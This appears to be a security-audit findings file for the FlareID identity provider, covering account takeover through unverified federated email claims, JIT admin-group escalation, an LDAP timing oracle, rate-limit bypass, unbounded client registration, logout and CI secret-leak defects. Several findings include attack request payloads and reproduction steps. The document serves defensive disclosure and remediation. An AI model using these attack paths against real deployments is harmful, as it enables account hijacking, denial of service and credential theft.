description: Inbound federation lets any holder of the federation:write permission - a normal delegable area (src/lib/permissions.ts:18) grantable to admin roles and mintable on non-admin API keys (legacy clients:write also expands to it, src/lib/permissions.ts:55) - create an upstream OIDC or SAML identity provider (POST /api/v1/federation/idps, src/routes/api.ts:936, permission 'federation:write'; console /admin/federation/idps, admin.ts:6603, area federation:write). Once an enabled IdP exists, ANY browser can start a login at /login/federated/:id and land the callback. resolveFederatedUser (src/lib/federation.ts:473-493) resolves the upstream identity to a local account by, in order: (1) an existing federated_identities link, (2) the profile username claim matching a local UPN via getUserByLoginIdentifier (line 486), (3) the profile email claim matching ANY contact address in the directory via getUserByAnyEmail (line 487). On a match it silently links the upstream subject to that account (line 491) and completeLoginFlow mints a session. Neither claim is required to be verified: profileFromClaims never reads OIDC email_verified (lines 439-456), and SAML attributes have no verification concept at all. An attacker running their own OIDC IdP (a few lines of config on any hosted OIDC provider, or a self-signed SAML certificate they control) asserts sub=anything, email=<victim's known address> and is signed in as that victim - including accounts holding admin roles and Super Admins: this revision has no administrator block on federated sign-in (finishFederatedLogin -> completeLoginFlow directly, src/routes/federation.ts:81-104; no isAdmin check anywhere in the path). The session then completes the original login flow, so the attacker also reaches downstream OIDC/SAML relying parties as the victim. Containment is the victim's own MFA policy: middleware's secondFactorGate revokes a session whose amr lacks a required enrolled factor ('login' -> revoke, src/lib/middleware.ts:68-76), so victims whose policy requires MFA AND have a factor enrolled are blocked; victims with no MFA requirement are impersonated outright, and victims required-but-unenrolled fall into the 'enrol' gate where the attacker's session may enrol a new factor (middleware.ts:63-66, account.ts:1246-1277) and proceed. The trust mismatch is the finding: a permission designed to be delegated below admin authority ('integrations' tier) exercises session-minting authority over the whole directory - equivalent to users:write's credential-reset power but granted to a different, lower-trust tier, with no verified-email requirement and no admin-scope check on adoption targets.
root_cause: Identity adoption trusts upstream-asserted, unverified address claims, and the gate on WHO may add an adopting IdP is the delegable federation:write permission rather than an admin-tier authority; no verified-email precondition, no admin-holder exemption, no per-IdP adoption opt-in.
intended_behavior: Adopting a pre-existing local account onto an upstream identity is an account-linking act of the same sensitivity as a credential reset: it should require either a verified-address claim (email_verified true), a first-time interactive confirmation by the account holder, or restriction of IdP registration/adoption to an admin-tier permission.

title: JIT provisioning inserts the new account without the grantsAdminRoleGroup check every other provisioning path applies - claim-controlled fields can land the JIT user in a dynamic admin-role group, and the same IdP signs the attacker in
description: Every account-creation writer in FlareID evaluates the would-be user row against grantsAdminRoleGroup before writing, so a non-admin provisioning peer cannot create a row that matches the rule of a dynamic group linked to an admin role: the SCIM create path builds an `after` row and checks it (src/routes/scim-server.ts:404-420), directory import does the same (src/lib/directory-import.ts:586-588), and the console/API user service calls assertNoAdminRoleGrant on create (src/services/users.ts:105-138). A role-linked dynamic group with a rule like {"all":[{"field":"status","op":"eq","value":"active"}]}, {"field":"username","op":"eq","value":"root"}, or a ne-rule matching non-empty attributes therefore swallows every JIT account that matches - and the upstream IdP controls those claim values. Unlike the other vectors, the grant is immediately usable: the JIT flow ends in completeLoginFlow, so the attacker signs straight into the newly-minted admin account. The session-gate does not save it: a JIT user has no enrolled factor, so where the instance requires MFA the gate is 'enrol' - the enrolment pages stay reachable and the attacker enrols their own TOTP/passkey, satisfying the requirement (src/lib/middleware.ts:63-66; account.ts:1246-1277 - resumeLoginFlow only re-checks that the enrolled factor satisfies the gate, which the attacker's own factor does). root_cause: resolveFederatedUser's JIT INSERT (src/lib/federation.ts:515-519) performs no grantsAdminRoleGroup evaluation of the row it creates - the invariant is enforced per-writer, and the JIT writer was never given the check.
intended_behavior: A JIT-provisioned account must not enter an admin-role group: evaluate the post-insert row (or the candidate values before insert) against grantsAdminRoleGroup and refuse/neutralize (e.g. provision as 'disabled' or strip matching claim-derived fields) - the same contract the SCIM, import, and console writers enforce.

title: LDAP bind failure path runs 3 hash verifications for unknown/unusable users vs 2 for real accounts, so wall time distinguishes 'no such usable account' from 'account exists, wrong password'
description: The run-2 fix for the PBKDF2-vs-scrypt format oracle pads every bind failure to 'one verify of each format', but it pads AFTER an initial verifyPassword that runs unconditionally. For an unknown, disabled, '!'-marked, or out-of-group user the stored hash is the configured-format dummy, so failures cost verify#1 (dummy, configured format) + a scrypt dummy + a PBKDF2 dummy = 3 verifications. For a usable account with a wrong password, failures cost verify#1 (real) + one complementary dummy = 2 verifications. On the default scrypt deployment that is ~2x wall-clock (~230ms vs ~120ms) between 'account does not exist or is not usable in this app' and 'account exists and is usable but the password is wrong' - an account-existence oracle stronger than the format oracle the fix removed. login.ts avoids this by skipping the initial verify for unusable users (it runs exactly the two dummies); bind.ts diverges from the pattern its own comment cites.

intended_behavior: Every bind failure should cost exactly one scrypt plus one PBKDF2 verification (the model login.ts:303-308 implements: skip the real verify when the user is unusable, then run both dummies), so response time cannot separate 'no such usable account' from 'usable account, bad password'.

`const format = usable && user ? storedHashFormat(stored) : null;` - null for unknown/unusable so BOTH complements below execute.
`if (format !== "scrypt") await verifyPassword(pw, await dummyHash(env, "scrypt"));`
`if (format !== "pbkdf2") await verifyPassword(pw, await dummyHash(env, "pbkdf2"));`

`const valid = usable ? await timed(...verifyPassword(password, user)) : false;` - web sign-in skips the initial verify for unusable users, then runs exactly the two dummies (lines 305-307): 2 verifies for every failure, no existence gap.

title: Per-connection failed-bind cap required by LDAP.md section 14 req 5 is not implemented: a connection can issue up to 10,000 bind attempts without ever being disconnected
description: LDAP.md section 14 ('Security requirements - non-negotiable') req 5 mandates: 'after 5 failed binds on one connection, send a Notice of Disconnection and close', and section 17 requires a test for it. The dispatch loop in connection.ts counts bind failures into the opCounts telemetry map (track("bind", RC.invalidCredentials) at line 297) but never enforces a cap: the only per-connection limits are MAX_OPS (10,000) and the idle timeout. The shared account/IP lockout (recordLoginAttempt) and the service-bind slug/IP counters do refuse individual attempts, so real password guessing is bounded - but a locked-out client is still free to burn up to 10,000 bind frames per connection (each still costs a settings re-read, a bind-name parse, and rate-limit row writes), and the documented defense-in-depth control and its required test simply do not exist.

title: Per-slug service-bind attempt counter counts successes, never clears, and caps total binds at 20/15min - 21 unauthenticated binds to cn=<slug>,ou=services lock the app out, and a busy app locks itself out

title: Factor enrolment without step-up: a stolen session plants an attacker-controlled TOTP or security questions, evicts the victim's sessions, and the planted factor survives password reset

For KBA the first-time set skips the current-password check that only applies when changing existing answers (account.ts:1416-1423). intended_behavior: Creating or replacing a credential that can authenticate the account (TOTP secret, backup-code-generating enrolment, security-question answers, passkey) must require fresh authentication or the current password within the step-up budget - the invariant passkeyStepUp already documents for passkeys - and the compromise-response revocation set (password change/reset) should clear every planted factor, not only webauthn_credentials.

title: Edge limiter still grants a fresh per-client budget for any existing client_id - open DCR lets one IPv4 mint unlimited budgets on /token, /introspect and /revoke (revalidation of run-1 attacker-controlled-client-dimension)
description: Revalidation of run-1 'flareid/edge-limit/attacker-controlled-client-dimension' (confirmed, medium). The run-1 root cause - caller-chosen quota key with no per-IP base charge - was partially fixed: clientDimension() now honours the client dimension only when the submitted client_id exists in oauth_clients (edge-limit.ts:60-62), so made-up spellings no longer mint buckets. The fix is incomplete in two ways. (1) Any EXISTING client_id still swaps the quota key from 'api:<ip>' to 'api:<ip>:client:<id>' - there is still no unconditional per-IP charge alongside it, so each distinct registered client is a separate 600/min budget. (2) The IPv6 /48 aggregate (edge-limit.ts:79-82) only applies to IPv6 sources; an IPv4 caller has no aggregate at all. Because POST /connect/register is anonymous and itself only costs one api-budget request per created client, an IPv4 attacker mints K clients (600/min sustained) and then rotates client_id across /token, /introspect and /revoke for K x 600 requests/min from a single address. Each rotated /token request can additionally force verifyClientAssertion work (multi-MB JSON.parse of a self-registered jwks, or a remote JWKS fetch) before any credential check succeeds.
root_cause: edge-limit.ts:74 builds the limiter key as `${group}:${rateLimitAddress(ip)}${await clientDimension(...)}`; the existence check at edge-limit.ts:60-62 narrows who can append the dimension but does not charge the per-IP bucket when a valid client_id is used, and the /48 aggregate check (lines 79-82) is gated on ip.includes(':') so IPv4 sources have no aggregate. Open DCR (registration.ts:117-160) makes 'existing client_id' a resource the attacker controls in arbitrary quantity.
intended_behavior: Per-client keying exists so legitimate RPs behind shared egress do not throttle each other; it must sit ON TOP OF an unconditional per-source budget, never replace it. The same multiplicative-identity reasoning that produced the /48 aggregate for IPv6 applies to client_id rotation on IPv4.

title: Edge rate limiter whitelist misses several unauthenticated write/parse endpoints (/device_authorization, /ssf/receive, /federation/*, /device, /oidc/init-login)
description: edgeRateLimit is the documented 'first line of defence ... before any handler can write anything' (src/lib/edge-limit.ts:7-16), but routeGroup() is a hand-maintained path whitelist that omits multiple anonymous-reachable endpoints which perform D1 writes, D1 reads, or expensive verification per request. POST /device_authorization (src/routes/device.ts:58-97) authenticates a client_id and INSERTs a persistent device_codes row on every call; because open DCR (POST /connect/register with token_endpoint_auth_method=none) mints public clients anonymously (src/routes/registration.ts:117-160), this endpoint is effectively unauthenticated and converts each request into a D1 INSERT at line rate. POST /ssf/receive (src/routes/ssf.ts:12-21) buffers the whole body, performs a D1 transmitter lookup by submitted iss (src/lib/ssf.ts:186), and runs RSA/ECDSA SET verification plus a remote JWKS fetch for a known issuer - all with no edge budget. /federation/saml/acs/:id (src/routes/federation.ts:135-157) buffers an unbounded chunked body and does base64 decode + XML DOM parse; /federation/oidc/callback performs outbound fetches. GET /device (src/routes/device.ts:103) and GET /oidc/init-login (src/routes/authorize.ts:122) perform a D1 lookup per anonymous request. GET /.well-known/*, /jwks.json, /saml/metadata are cheap but equally uncovered. The gap is whitelist drift: endpoints added after edge-limit.ts (device flow, SSF, federation callbacks, init-login) were never added to routeGroup(). title: 4 MiB body cap checks only declared Content-Length - chunked bodies bypass it and are buffered in full (twice on /token, /introspect, /revoke); revalidation of run-1 unbounded-anonymous-request-body-buffering
description: Revalidation of run-1 'flareid:index.ts:unbounded-anonymous-request-body-buffering' (needs_validation). Changed since run-1: a 4 MiB declared-length cap now exists (index.ts:49-54). title: 'enrol'-gated user whose enrolled factor was switched off loops forever between /account/mfa/setup and /account/security (new instance of the run-1 redirect-loop defect)
description: secondFactorGate returns 'enrol' when the policy requires a second factor and the user has none currently usable - where 'usable' includes the administrator's factor switch (hasSecondFactor filters on isFactorEnabled/isFactorUsable, auth-policy.ts:161-167). A user with mfa_enabled=1 whose TOTP factor was subsequently disabled therefore hits the 'enrol' verdict. requireSession then exempts only /account/mfa* and /account/passkeys* (middleware.ts:65-66) and bounces everything else to /account/mfa/setup. But GET /account/mfa/setup immediately redirects any user with mfa_enabled=1 to /account/security (account.ts:1123) - which is not an exempted path, so the gate bounces the request straight back to /account/mfa/setup. Two server-side 302s ping-pong indefinitely; the browser's fetch-redirect limit gives up and the user cannot reach any account page. Recovery exists but is non-obvious: POST /account/mfa/disable with a still-valid authenticator or backup code (reachable under the /account/mfa exemption), or enrolling a passkey through the JSON endpoints. This is the same defect class as the fixed run-1 record flareid:middleware-mfa-gate-login-redirect-loop, moved to the 'enrol' verdict edge.

The enrolment page's eligibility test (user.mfa_enabled) does not match the gate's usability test (hasSecondFactor, which includes the factor switch).

title: login:ip48 aggregate bucket is never refunded - successful logins permanently drain the shared /48 budget, locking out legitimately shared allocations
description: recordLoginAttempt and recordMfaAttempt charge three buckets per attempt: login:upn:<acct>, login:ip:</64>, and login:ip48:</48> (rate-limit.ts:135-143, 156-164). After a successful sign-in, clearLoginAttempts/clearMfaAttempts call refundIpAttempt, which refunds ONLY the login:ip:</64> key (rate-limit.ts:112-114, 147-150) - the comment at line 111 says the per-IP bucket 'counts failures only', but the /48 aggregate is never refunded, so it counts successes too. The /48 budget is maxAttempts x 20 x 4 = 400 attempts per window (rate-limit.ts:143). A site that legitimately shares a /48 allocation (university, ISP, VPN egress - exactly the case the comments cite for the aggregate's generosity) burns through 400 attempts per window including all successful logins, after which every sign-in from the allocation fails until the window slides. An attacker co-located in a victim's /48 can also deliberately burn the aggregate to deny sign-in to everyone else sharing it - cross-principal denial with no refund path.
root_cause: refundIpAttempt (rate-limit.ts:112-114) issues UPDATE ... WHERE key = 'login:ip:</64>' only; clearLoginAttempts (147-150) and clearMfaAttempts (167-171) pass only that same single key - there is no refund for the login:ip48: key introduced by the /48 aggregate.
intended_behavior: Consistent with the design stated at rate-limit.ts:111 ('A successful step gives its unit back to the shared per-IP bucket, so that bucket counts failures only'), the /48 aggregate should be refunded on success as well so it measures failures, not total activity.

Success path calls refundIpAttempt(ip) which targets only the /64 key
UPDATE rate_limits SET count = MAX(count - 1, 0) WHERE key = 'login:ip:' - no corresponding UPDATE for 'login:ip48:'

/48 budget = maxAttempts * IP_BUCKET_ATTEMPT_MULTIPLIER * IP48_BUCKET_ATTEMPT_MULTIPLIER = 400 with defaults
clearMfaAttempts same asymmetry for the MFA step

conditions.description: Requires IPv6 sources sharing a /48 allocation - a common real-world layout (campus, ISP, VPN) that the code itself acknowledges.
The aggregate is a fixed-window counter purged only by the hourly cleanup beyond the window; 400 aggregate attempts (incl. successes) in a window locks the whole /48.

execution.attacker_perspective: An attacker with addresses inside the same /48 as victim users (shared campus/VPN egress) rotates source /64s and makes >400 login attempts per window - trivially satisfied since each fresh /64 re-opens its own 100-attempt budget while all attempts accumulate on the one /48 key - after which all sign-ins from that allocation fail.
payloads: POST /login flow_id=<valid>&upn=<any>&password=<any> from rotating addresses within one /48 (400+ times per window)
instructions: Read refundIpAttempt and confirm no 'login:ip48:' key is ever decremented or refunded.
Trace recordLoginAttempt to confirm every attempt (including ones that will succeed) increments the /48 counter.
execution.observed_result: By source inspection: the /48 aggregate monotonically increases on every attempt until the window rolls, so 400 aggregate attempts per window (incl. legitimate successes) deny sign-in for the entire shared allocation.

title: Open DCR creates persistent oauth_clients rows with no count cap, no expiry, and no per-field size limit - including multi-MB jwks re-parsed on every /token attempt
description: POST /connect/register (registration.ts:117-160) lets any anonymous caller INSERT a permanent oauth_clients row per request. There is no cap on the number of dynamic clients, no expiry or cleanup for abandoned ones (purgeExpiredState in lib/cleanup.ts does not touch oauth_clients), and no per-field length bound: redirect_uris arrays, jwks objects and other metadata are JSON.stringify'd into the row at whatever size the (4 MiB declared / unbounded chunked) request body allowed. Two resource consequences follow. (1) Persistent D1 growth at up to ~600 rows/min/IP (api edge budget) of up to ~4 MiB stored metadata each - operator-owned storage accumulating without bound or reclamation. (2) Computational: verifyClientAssertion (oauth-client-auth.ts:20-22) runs createLocalJWKSet(JSON.parse(client.jwks)) on every /token attempt presenting a client_assertion - an attacker registers a client whose jwks is a multi-MB document with thousands of keys, then each /token call under that client_id pays a multi-millisecond parse; combined with the per-client budget rotation (h-ratelimit-02), this work is effectively unbounded per source IP. remoteJwks (oauth-client-auth.ts:10,26-30) is also an unbounded module-scope Map keyed by attacker-registered jwks_uri values.
root_cause: registration.ts performs an unconditional INSERT with no count quota, no per-field size validation (only shape/allowlist checks in validate(), lines 54-94), no dynamic-client expiry, and no distinction in downstream consumers between admin-created and self-registered rows - so client.jwks feeds a per-request JSON.parse in oauth-client-auth.ts:21.
intended_behavior: Open registration should carry its own containment: a per-source creation rate or total dynamic-client ceiling, per-field size limits (jwks bytes, redirect_uris count/length), and expiry/reaping of unused dynamic clients (RFC 7592 already gives each client a management token that could also carry TTL semantics).

JSON.parse(client.jwks) + createLocalJWKSet on every /token request that presents a client_assertion for that client
remoteJwks Map grows unboundedly, keyed by attacker-registered jwks_uri

evidence.description: INSERT INTO oauth_clients ... - no SELECT COUNT gate, no dynamic-client TTL, no row-size cap on jwks/redirect_uris JSON
purgeExpiredState batch does not include oauth_clients - registered rows never age out

Every registered client_id also mints a fresh edge budget - storage growth feeds request-rate growth

Rows persist until an admin deletes them; the jwks-parse cost applies per /token attempt for the life of the client.

execution.attacker_perspective: Anonymous caller streams POST /connect/register requests, optionally carrying a jwks object of several MB; afterwards rotates /token client_assertion attempts across the created clients.
payloads: POST /connect/register {"redirect_uris":["https://a.example/cb"],"token_endpoint_auth_method":"private_key_jwt","jwks":{"keys":[<thousands of keys>]}}
POST /token grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=<garbage.jwt.here>&client_id=<registered>
instructions: Confirm no count cap or expiry on oauth_clients inserts and no size bound on stored jwks/redirect_uris.
Register one client with a multi-MB jwks, then time a /token attempt carrying any client_assertion - the handler pays JSON.parse(jwks) before failing verification.
execution.observed_result: By source inspection: persistent storage grows at up to ~600 rows/min/IP with up to ~4 MiB metadata each and is never reaped; each /token attempt re-parses the stored jwks, and per-client budget rotation removes the request-rate ceiling.

remediation.strategy: Bound registration itself (stricter per-source budget or a dedicated group), cap stored field sizes (jwks <= ~64 KB, redirect_uris <= ~32 entries/8 KB), add a maximum dynamic-client count, and give dynamic clients an expires_at reaped by purgeExpiredState unless refreshed via RFC 7592 read/update; cache parsed JWKS per client_id instead of re-parsing per request.

likelihood.reason: Fully anonymous, one request per row, no obstacles; multiplicative with the budget-rotation finding.

impact.reason: Unbounded persistent storage growth (operator spend) plus per-request compute amplification; recovery requires manual cleanup since no reaper exists.

confidence.reason: Missing quota/expiry/size bounds and the per-request re-parse are all directly visible in source.

title: receiveSet iterates every entry in the SET's events object - one verified SET with thousands of event entries triggers a D1 lookup (and possible session/token revocation) per entry in a single request
description: receiveSet (lib/ssf.ts:207-229) loops `for (const [uri, body] of Object.entries(events))` with no cardinality bound. For each entry with an email subject it runs a LEFT-JOIN userByEmail query (line 209 -> 153-157); for session-revoked events it additionally runs revokeAllSessionsForUser + revokeTokensForUser + an audit insert (lines 212-214); for credential-compromise/account-disabled it runs flagUser + audit (222-224). A registered transmitter can therefore fold thousands of D1 queries, revocations, and audit writes into ONE POST /ssf/receive, far exceeding per-request subrequest/CPU budgets and potentially leaving the request dead mid-loop after partial effects (a revocation for user A applied, the rest lost - silent partial enforcement with no record of the truncation). The events object has no size cap anywhere: the body buffer (ssf.ts route line 13) is bounded only by the chunked-body gap, and the JWT payload is parsed in full. Transmitter trust tier: must hold a signing key registered as an ssf_transmitters row - an authenticated principal - but the SET body remains untrusted content, and a compromised/malfunctioning transmitter or a legitimately large batch pushes per-request work past platform limits.
root_cause: lib/ssf.ts:207 iterates the events object with no max-count check; per-entry work includes a D1 join and, for recognized event types, revocation cascades plus audit inserts - all inside one request whose subrequest/CPU budget is finite.
intended_behavior: Bound the events object (e.g. reject or truncate at a few dozen entries), and/or batch the subject lookups; a SET that exceeds the bound should be refused explicitly rather than partially applied.

Object.entries(events) - no cardinality bound on attacker-influenced payload
Per-entry userByEmail D1 join; recognized events add session/token revocation + audit write per entry

execution.observed_result: By source inspection: one request multiplies into unbounded D1 reads/writes/revocations; exceeding platform limits mid-loop yields silently partial enforcement.

remediation.strategy: Cap Object.entries(events) at a small constant (e.g. 50) with an explicit invalid_set error, and batch subject resolution (single IN query) before applying effects.

likelihood.reason: Requires a registered transmitter credential; abuse is deliberate-misuse or compromise of a configured peer.

impact.reason: One request -> unbounded D1 work, mass revocation of sessions/tokens across many users, and possible silent partial application - real cross-user integrity/availability effect, though behind an authenticated principal.

confidence.reason: The unbounded loop and per-entry D1 work are directly visible; only the transmitter compromise precondition lowers the rating.

title: Back-channel logout tokens are never delivered on any browser-initiated logout: session_clients is wiped before the back-channel fan-out reads it
description: When a user signs out through either browser logout path (POST /logout in src/routes/login.ts, or RP-initiated /oidc/logout in src/routes/oidc-session.ts), the handler first calls frontchannelTargets() to collect front-channel iframe targets. frontchannelTargets() unconditionally DELETEs every session_clients row for that session (src/lib/frontchannel.ts:20). revokeSession() then runs and invokes notifySessionRevoked(), whose back-channel fan-out SELECTs session_clients JOIN oauth_clients (src/lib/backchannel.ts:31-34) - now always empty, so zero logout_tokens are POSTed to any backchannel_logout_uri. Back-channel notification only works on paths that never call frontchannelTargets (admin session revoke, revokeAllSessionsForUser, SAML SLO, middleware gate revocation). Relying parties that registered only a back-channel logout URI therefore keep live RP sessions after the user's IdP session ended - the exact outcome the mechanism exists to prevent.
root_cause: Ordering: frontchannelTargets() both enumerates and deletes the (session, client) rows that notifySessionRevoked() needs, and both callers invoke it before revokeSession(). The DELETE at src/lib/frontchannel.ts:20 was presumably meant to prevent double front-channel delivery, but it also starves the back-channel fan-out which reads the same table.
intended_behavior: OIDC Back-Channel Logout 1.0: when the OP session ends, every client that touched the session and registered backchannel_logout_uri receives a POSTed logout_token. The delivery set must be read before (or independently of) the session_clients cleanup used for front-channel de-dup.

trace.description: RP-initiated logout handler: line 158 calls frontchannelTargets(session.id), line 160 calls revokeSession(session.id). Same order at src/routes/login.ts:167-168 (POST /logout).
DELETE FROM session_clients WHERE session_id = ? - removes every client row for the session, including rows whose clients registered only a back-channel URI.
revokeSession marks the session revoked then calls notifySessionRevoked(env, [sessionId]).

SELECT sc.session_id, oc.client_id, oc.backchannel_logout_uri FROM session_clients sc JOIN oauth_clients oc ... - session_clients is already empty, so results = [] and no logout_token is ever POSTed on these paths.

evidence.description: const targets = session ? await frontchannelTargets(c.env, session.id) : []; runs before revokeSession at line 160.
Identical ordering in the plain /logout handler: frontchannelTargets at 167, revokeSession at 168.
Unconditional DELETE FROM session_clients WHERE session_id = ? inside the function that only needs to read the URIs.
Fan-out query depends on session_clients rows that no longer exist by the time it runs; Promise.allSettled over an empty array sends nothing.

conditions.description: At least one OIDC client that the session authorized has backchannel_logout_uri set (and no reliance solely on front-channel).
The user ends the session via POST /logout or RP-initiated /oidc/logout rather than an admin/SSF/password-change revocation path.

execution.attacker_perspective: Not attacker-driven; this is a security-control failure. The observable effect is on a relying party that trusts the OP's back-channel logout promise.
payloads: Register a client with backchannel_logout_uri=https://rp.example/logout (via DCR or admin).
Sign a user in through that client (inserts session_clients).
POST /logout or GET /oidc/logout?id_token_hint=<token with matching sid>.
instructions: Instrument or point the backchannel_logout_uri at a local receiver in a dev deployment.
Complete an authorization flow so a session_clients row exists.
Sign out via /logout; observe that the receiver never receives the logout_token POST, while the same revoke performed from /admin sessions does deliver it.
execution.observed_result: Source order guarantees zero deliveries: session_clients is empty by the time notifySessionRevoked queries it on both browser logout paths.

remediation.strategy: Deliver the back-channel fan-out before the front-channel cleanup, or stop coupling them. Simplest: in login.ts and oidc-session.ts call revokeSession() before frontchannelTargets() (the delete then also serves as de-dup for repeat logouts). Alternatively, have frontchannelTargets not delete and let cleanup.ts/CRM own the rows - revoked sessions can never re-emit since getSession returns null.

if (session) await revokeSession(c.env, session.id);
const targets = session ? await frontchannelTargets(c.env, session.id) : [];

likelihood.reason: Deterministic: every browser logout where a backchannel-registered client was involved silently skips the logout_token delivery.

impact.reason: RP sessions survive IdP logout for back-channel-only clients until their own expiry - the invalidation contract is defeated on the primary logout path, though other revocation paths still deliver.

confidence.reason: Pure source-ordering argument; both callers and both lib functions read directly. No runtime behavior assumed.

title: conformance-results artifact upload runs with `if: always()` even when the secret-scrub step fails
description: The oidc-conformance workflow added a scrub step (`conformance/redact-exports.mjs`) that rewrites exported suite logs to remove the client secrets, seeded user password and CONFORMANCE_TOKEN before upload. However the upload step itself is conditioned `if: always()`, so it still executes when the scrub step fails. redact-exports.mjs exits 2 whenever the suite config is missing or unreadable (e.g. the seed step failed, leaving conformance/suite-config.json absent) and exits non-zero on any read/parse error of the export tree - in each case the unscrubbed conformance-results/ directory is uploaded anyway and retained for 14 days. GitHub Actions `always()` evaluates to true even when a prior step failed, so the one control intended to keep durable secrets out of the artifact has a silent bypass on exactly the failure paths where partial exports are most likely to exist. [Fixed in flight: commit ffb6db6 gates the artifact upload on steps.scrub.outcome == 'success'.]
root_cause: Both 'Scrub shared secrets' and 'Keep the suite's exported results' use `if: always()` (.github/workflows/oidc-conformance.yml:75-87). `always()` decouples the upload from the scrub result: step outcome does not gate the artifact write, so a scrub failure still produces the artifact the scrub exists to prevent.
intended_behavior: The artifact upload must only run when the export tree exists AND the scrub completed successfully - i.e. `if: success() || (failure() && steps.scrub.outcome == 'success')` style gating, or simplest: keep `if: always()` on the scrub (so partial exports are still cleaned) but change the upload to `if: success()` so a failed scrub fails the job without uploading.

trace.description: JSON.parse(readFileSync(configPath)) - a missing or malformed suite-config.json (seed step failed) throws and exits the step non-zero; the same happens for an unreadable export dir at files(dir).
'Scrub shared secrets' step runs `if: always()` and can fail; its failure does not prevent the next step.
'Keep the suite's exported results' also runs `if: always()` - uploads conformance-results/ unconditionally, including when the scrub just failed, and retains it 14 days.

evidence.description: `if: always()` on the scrub step - correct, so partial exports are still cleaned.
`if: always()` on the upload step - the defect; always() is true even when the preceding scrub step failed.
usage/exit(2) path plus unchecked readFileSync/JSON.parse/readdirSync calls: several concrete inputs make the scrub step fail (missing config, missing export dir, malformed JSON).
Literal string replacement is the only scrub mechanism; whatever it does not rewrite is uploaded verbatim when it fails to run.

conditions.description: The redact-exports step must fail in a run where conformance-results/ holds unscrubbed material - e.g. the seed step fails after the suite produced exports, suite-config.json is absent/corrupt, or the export tree contains an unreadable file.
Reach of the artifact depends on repository visibility and Actions permissions; on a public repository any authenticated GitHub user with read access can download it during the 14-day retention.

execution.attacker_perspective: No external attacker action is needed to trigger the unsafe state; an attacker able to read workflow artifacts (repo readers on a public repo, collaborators on a private one) then recovers durable credentials from the unscrubbed upload.
payloads: Trigger the workflow with the seed step failing (e.g. revoked FLAREID_CONFORMANCE_API_KEY) after exports exist, or with a conformance-results/ containing a file that makes readdirSync/readFileSync throw (e.g. a dangling symlink or permission-denied entry injected via a suite-run artifact).
instructions: Arrange conformance-results/ to exist while suite-config.json is absent (seed-step failure).
The 'Scrub shared secrets' step exits 2 at redact-exports.mjs:18/56.
The upload step still runs because `always()` ignores the failure; the artifact 'conformance-results' is retained 14 days.
Download the artifact and read unredacted client secrets / CONFORMANCE_TOKEN from the suite logs.
execution.observed_result: Source-verified control flow: `always()` on the upload step is independent of the scrub step's outcome, and the scrub has concrete non-zero exit paths. The bypass is deterministic once the scrub fails.

remediation.strategy: Gate the upload on a successful scrub. Change the upload step to `if: success()` is too strong (it would also skip uploads for failing test runs, which are exactly the ones worth keeping) - instead give the scrub step an id and require its success: `if: always() && steps.scrub.outcome == 'success'`. Alternatively make the scrub step fail-safe by having redact-exports.mjs tolerate a missing config and still scrub CONFORMANCE_TOKEN, and/or delete the export dir when the config cannot be loaded.

code_changes.fixed_code:
- name: Scrub shared secrets from the suite exports
        id: scrub
        if: always()
        env:
          CONFORMANCE_TOKEN: ${{ secrets.CONFORMANCE_TOKEN }}
        run: node conformance/redact-exports.mjs conformance-results conformance/suite-config.json

      - name: Keep the suite's exported results
        # Only upload exports the scrub actually processed: never upload when
        # redaction failed, since they may carry live client secrets.
        if: always() && steps.scrub.outcome == 'success'
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: conformance-results
          path: conformance-results
          if-no-files-found: ignore
          retention-days: 14

likelihood.reason: Requires the scrub step itself to fail while exports exist - an infrequent path (seed failure, unreadable file). No attacker trigger is available on the scheduled/dispatch-only workflow.

impact.reason: An unscrubbed upload persists a permanent suite API token, live trusted-client secrets and a user password for 14 days to anyone who can read repo Actions artifacts; on a public repository that audience is effectively unbounded.

confidence.reason: The step-condition semantics of `always()` and the concrete non-zero exit paths in redact-exports.mjs are both fully source-verified.

title: e2e/state/lab-key.json (a full-scope FlareID API key) is not git-ignored while sibling secret files are

title: updateGroup lacks the system-group guard its sibling mutators enforce - a groups:write principal can inject members into the 'Risk watchlist' group (SCIM-pushed immediately) and toggle requestable
description: The watchlist group (groups.system='watchlist') is documented in migration 0040 as 'membership is maintained by code and cannot be edited by hand', and every sibling mutator enforces it: deleteGroup, addGroupMembers, removeGroupMember, addGroupManagers and bulkSetRequestable all refuse or skip system groups. updateGroup does not check current.system (its only system-aware clause blocks cf_list_sync, line 106). Concretely: (a) the console POST /admin/groups/{id} computes members = before ∪ form additions (admin.ts:2548-2549), so a non-super groups:write admin can inject arbitrary users into the watchlist group - the write's afterResponse immediately SCIM-pushes them (updateGroup:116 + syncGroupBestEffort) as flagged members; (b) the API PATCH /api/v1/groups/{id} (groups:write) can set requestable=1 and rename/redescribe the system group; injected members persist until reconcileWatchlist() restores the set from user_watch rows (hourly sweep, or next flag/unflag), so the divergence is windowed but the downstream push is instant. Removal of flagged members is not reachable this way (console unions before, API omits memberIds), but the 'cannot be edited by hand' invariant is broken on this path.
root_cause: src/services/groups.ts:77-112 - updateGroup never tests current.system before rewriting group_members and group fields, unlike every other mutator enforcing the same invariant.
intended_behavior: System-group rows are code-maintained: updateGroup should refuse member-affecting and requestable edits when current.system is set, matching deleteGroup/addGroupMembers/removeGroupMember/addGroupManagers/bulkSetRequestable.

trace.description: groups:write console path; members = existing ∪ submitted additions, passed to updateGroup - additions land on the watchlist group.
groups:write API path; passes name/description/requestable/schema into updateGroup - requestable can be set on the system group.
No current.system check; only cf_list_sync is suppressed for system groups (line 106), showing the type was considered and left open.
DELETE+INSERT group_members executed for the system group; syncGroupBestEffort SCIM-pushes the forged membership at :116.
